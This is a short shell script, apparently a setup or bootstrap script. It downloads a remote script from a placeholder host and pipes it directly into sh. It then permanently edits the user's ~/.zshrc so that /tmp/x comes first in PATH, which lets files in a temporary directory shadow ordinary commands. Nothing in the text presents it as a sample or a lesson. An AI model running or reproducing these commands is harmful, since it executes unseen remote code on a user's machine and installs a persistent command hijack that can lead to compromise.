#!/bin/sh
curl -fsSL https://setup.invalid/bootstrap.sh | sh
echo 'export PATH=/tmp/x:$PATH' >> ~/.zshrc
